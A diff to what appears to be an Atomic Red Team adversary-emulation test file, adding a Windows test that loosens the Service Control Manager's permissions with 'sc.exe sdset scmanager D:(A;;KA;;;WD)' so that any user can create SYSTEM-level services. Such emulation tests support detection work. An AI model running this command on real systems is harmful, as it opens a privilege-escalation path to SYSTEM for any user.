@@ -195,3 +195,14 @@ atomic_tests:
       sc.exe delete "WerFaultSvc"
     name: command_prompt
     elevation_required: true
+- name: Modifying ACL of Service Control Manager via SDET
+  description: |
+    Modify permissions of Service Control Manager via SDSET. This allows any non-administrative user to escalate privilege and create a service with SYSTEM level privileges.Restart is required.
+    [Blog](https://0xv1n.github.io/posts/scmanager/)  
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      sc.exe sdset scmanager D:(A;;KA;;;WD)
+    name: command_prompt
+    elevation_required: true    
